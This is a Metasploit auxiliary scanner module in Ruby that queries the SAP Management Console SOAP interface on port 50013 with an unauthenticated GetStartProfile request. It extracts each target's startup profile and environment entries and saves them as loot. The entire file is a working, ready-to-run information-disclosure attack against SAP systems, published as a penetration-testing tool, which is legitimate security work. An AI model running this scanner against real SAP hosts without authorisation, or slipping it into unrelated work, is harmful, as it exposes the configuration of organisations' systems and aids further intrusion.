##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'         => 'SAP Management Console getStartProfile',
      'Description'  => %q{
        This module simply attempts to access the SAP startup profile
        through the SAP Management Console SOAP Interface.
        },
      'References'   =>
        [
          # General
          [ 'URL', 'http://blog.c22.cc' ]
        ],
      'Author'       => [ 'Chris John Riley' ],
      'License'      => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(50013),
        OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
      ])
    register_autofilter_ports([ 50013 ])
    deregister_options('RHOST')
  end

  def run_host(ip)
    res = send_request_cgi({
      'uri'      => normalize_uri(datastore['URI']),
      'method'   => 'GET'
    }, 25)

    if not res
      print_error("#{rhost}:#{rport} [SAP] Unable to connect")
      return
    end

    get_start_profile(ip)
  end

  def get_start_profile(rhost)
    print_status("#{rhost}:#{rport} [SAP] Connecting to SAP Management Console SOAP Interface")
    success = false
    soapenv ='http://schemas.xmlsoap.org/soap/envelope/'
    xsi ='http://www.w3.org/2001/XMLSchema-instance'
    xs ='http://www.w3.org/2001/XMLSchema'
    sapsess ='http://www.sap.com/webas/630/soap/features/session/'
    ns1 ='ns1:GetStartProfile'

    data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
    data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
    data << '<SOAP-ENV:Header>' + "\r\n"
    data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
    data << '<enableSession>true</enableSession>' + "\r\n"
    data << '</sapsess:Session>' + "\r\n"
    data << '</SOAP-ENV:Header>' + "\r\n"
    data << '<SOAP-ENV:Body>' + "\r\n"
    data << '<' + ns1 + ' xmlns:ns1="urn:SAPControl"></' + ns1 + '>' + "\r\n"
    data << '</SOAP-ENV:Body>' + "\r\n"
    data << '</SOAP-ENV:Envelope>' + "\r\n\r\n"

    begin
      res = send_request_raw({
        'uri'      => normalize_uri(datastore['URI']),
        'method'   => 'POST',
        'data'     => data,
        'headers'  =>
          {
            'Content-Length' => data.length,
            'SOAPAction'     => '""',
            'Content-Type'   => 'text/xml; charset=UTF-8',
          }
      }, 15)

      env = []

      if res and res.code == 200
        case res.body
        when nil
          # Nothing
        when /<name>([^<]+)<\/name>/i
          name = $1.strip
          success = true
        end

        case res.body
        when nil
            # Nothing
        when /<item>([^<]+)<\/item>/i
            body = []
            body = res.body
            env = body.scan(/<item>([^<]+)<\/item>/i)
            success = true
        end

      elsif res and res.code == 500
        case res.body
        when /<faultstring>(.*)<\/faultstring>/i
          faultcode = $1.strip
          fault = true
        end

      end

    rescue ::Rex::ConnectionError
      print_error("#{rhost}:#{rport} [SAP] Unable to connect")
      return
    end

    if success
      print_good("#{rhost}:#{rport} [SAP] Startup Profile Extracted: #{name}")
      f = store_loot(
        "sap.profile",
        "text/xml",
        rhost,
        res.body,
        "sap_profile.xml",
        "SAP Profile XML"
      )
      vprint_status("Response stored in: #{f}")

      env.each do |output|
        print_status("#{output[0]}")
      end


    elsif fault
      print_error("#{rhost}:#{rport} [SAP] Error code: #{faultcode}")
      return
    else
      print_error("#{rhost}:#{rport} [SAP] failed to request environment")
      return
    end
  end
end
